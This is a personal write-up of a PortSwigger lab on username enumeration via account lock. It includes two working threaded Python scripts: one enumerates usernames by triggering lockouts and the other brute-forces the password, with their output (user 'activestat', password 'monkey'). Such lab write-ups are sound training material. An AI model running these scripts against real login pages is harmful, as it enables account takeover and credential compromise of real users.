# Username enumeration via account lock

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock), you'll learn: Username enumeration via account lock! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

This lab is vulnerable to username enumeration. It uses account locking, but this contains a logic flaw. To solve the lab, enumerate a valid username, brute-force this user's password, then access their account page.

- [Candidate usernames](https://portswigger.net/web-security/authentication/auth-lab-usernames)
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Exploitation

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-7/images/Pasted%20image%2020221222015953.png)

**Let's try to login as an invalid user:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-7/images/Pasted%20image%2020221222020228.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-7/images/Pasted%20image%2020221222020241.png)

It displays `Invalid username or password.`.

**Let's try to use a python script to login as different users 5 times:**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def fetchUsername(filename):
    listUsername = list()

    with open(filename) as fd:
        for line in fd:
            listUsername.append(line.strip())

    return listUsername

def sendRequest(url, cookie, username):
    loginData = {
        'username': username,
        'password': 'anything'
    }

    listLoginRequestText = list()

    listLoginRequestText.append(requests.post(url, cookies=cookie, data=loginData).text)
    listLoginRequestText.append(requests.post(url, cookies=cookie, data=loginData).text)
    listLoginRequestText.append(requests.post(url, cookies=cookie, data=loginData).text)
    listLoginRequestText.append(requests.post(url, cookies=cookie, data=loginData).text)
    listLoginRequestText.append(requests.post(url, cookies=cookie, data=loginData).text)

    for request in listLoginRequestText:
        if 'Invalid username or password.' not in request:
            print(f'[+] Found user: {username}')

def main():
    url = 'https://0a5800d40365f484c07836ae00550058.web-security-academy.net/login'
    cookie = {'session': 'X0W6GBckB490eopZRS9bX6cI2QsFWb1v'}

    userFileName = './auth_username.txt'
    listUsername = fetchUsername(userFileName)
    
    for username in listUsername:
        thread = Thread(target=sendRequest, args=(url, cookie, username))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_username_aclock.py 
[+] Found user: activestat
```

- Found user: `activestat`

**Let's check that account is locked or not!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-7/images/Pasted%20image%2020221222021005.png)

Yep, it's locked.

**Now, we can confirm that user `activestat` is exist, and we also able to brute force this account.**
```py
#!/usr/bin/env python3

import requests
from threading import Thread
from time import sleep

def fetchPassword(filename):
    listPassword = list()

    with open(filename) as fd:
        for line in fd:
            listPassword.append(line.strip())

    return listPassword

def sendRequest(url, cookie, password):
    loginData = {
        'username': 'activestat',
        'password': password
    }

    loginRequestText = requests.post(url, cookies=cookie, data=loginData).text

    if 'Invalid username or password.' not in loginRequestText and 'You have made too many incorrect login attempts. Please try again in 1 minute(s).' not in loginRequestText:
        print(f'[+] Found password: {password}')

def main():
    url = 'https://0a5800d40365f484c07836ae00550058.web-security-academy.net/login'
    cookie = {'session': 'X0W6GBckB490eopZRS9bX6cI2QsFWb1v'}

    passwordFileName = './auth_password.txt'
    listPassword = fetchPassword(passwordFileName)
    
    for password in listPassword:
        thread = Thread(target=sendRequest, args=(url, cookie, password))
        thread.start()
        sleep(0.2)

if __name__ == '__main__':
    main()
```

```
┌──(root🌸siunam)-[~/ctf/Portswigger-Labs/Authentication]
└─# python3 enum_password_aclock.py
[+] Found password: monkey
```

- Found user `activestat`'s password: `monkey`

**Let's wait for a minute to let the account unlock and login as user `activestat`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-7/images/Pasted%20image%2020221222022442.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Authentication/Auth-7/images/Pasted%20image%2020221222022600.png)

We're user `activestat`!

# What we've learned:

1. Username enumeration via account lock